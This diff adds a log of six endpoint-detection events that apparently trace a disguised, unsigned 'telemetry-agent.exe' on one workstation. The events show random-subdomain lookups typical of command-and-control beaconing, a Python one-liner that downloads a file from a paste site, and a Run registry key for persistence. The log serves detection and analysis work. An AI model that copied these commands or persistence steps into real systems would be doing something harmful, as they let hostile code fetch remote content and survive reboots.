@@ -1,0 +1,64 @@
+=== EDR EVENT ===
+  timestamp    : 2026-08-03T11:03:58Z
+  host         : wks-4471
+  event_type   : process_create
+  pid          : 7742
+  parent_pid   : 1188
+  parent_image : C:\Windows\System32\svchost.exe
+  image        : C:\Users\j.lindqvist\AppData\Local\Temp\svc-telemetry\telemetry-agent.exe
+  cmdline      : "telemetry-agent.exe" --mode sync --profile default
+                 --endpoint cdn-telemetry-sync.net --interval 300
+  signer       : (unsigned)
+  hash_sha256  : 4f1c8a9e77b02d6153ae0cb84f9d2e17ac6b5013e8f4d9a2c7b16e05f38d94ab
+=== END EVENT ===
+=== EDR EVENT ===
+  timestamp    : 2026-08-03T11:04:11Z
+  host         : wks-4471
+  event_type   : network_connect_attempt
+  pid          : 7742
+  image        : C:\Users\j.lindqvist\AppData\Local\Temp\svc-telemetry\telemetry-agent.exe
+  remote_name  : k7f2p9x4qm3vhb8ndt6rwz1csa5ylge0.cdn-telemetry-sync.net
+  remote_port  : 443
+  result       : name_resolution_failed
+=== END EVENT ===
+=== EDR EVENT ===
+  timestamp    : 2026-08-03T11:23:57Z
+  host         : wks-4471
+  event_type   : process_create
+  pid          : 8104
+  parent_pid   : 7742
+  parent_image : C:\Users\j.lindqvist\AppData\Local\Temp\svc-telemetry\telemetry-agent.exe
+  image        : C:\Program Files\Python311\python.exe
+  cmdline      : python.exe -c "import urllib.request;
+                 urllib.request.urlretrieve('https://paste.example-devtools.io/raw/9fL2xQ',
+                 'cfg.json')"
+  signer       : Python Software Foundation
+  hash_sha256  : 9be4d0a1c25f7386b0417ee2d9c4a8f5013bd7e6c2941fa08d53b71ce6082f4d
+=== END EVENT ===
+=== EDR EVENT ===
+  timestamp    : 2026-08-03T11:24:16Z
+  host         : wks-4471
+  event_type   : file_write
+  pid          : 8104
+  path         : C:\Users\j.lindqvist\AppData\Local\Temp\svc-telemetry\cfg.json
+  size_bytes   : 2044
+=== END EVENT ===
+=== EDR EVENT ===
+  timestamp    : 2026-08-03T11:31:02Z
+  host         : wks-4471
+  event_type   : persistence_registry_write
+  pid          : 7742
+  key          : HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SvcTelemetry
+  value        : "C:\Users\j.lindqvist\AppData\Local\Temp\svc-telemetry\telemetry-agent.exe"
+                 --mode sync --silent
+=== END EVENT ===
+=== EDR EVENT ===
+  timestamp    : 2026-08-03T11:44:15Z
+  host         : wks-4471
+  event_type   : network_connect_attempt
+  pid          : 7742
+  image        : C:\Users\j.lindqvist\AppData\Local\Temp\svc-telemetry\telemetry-agent.exe
+  remote_name  : j5wr9ntb2xz7qkv4hd1muy8gcpa3e60f.cdn-telemetry-sync.net
+  remote_port  : 443
+  result       : name_resolution_failed
+=== END EVENT ===
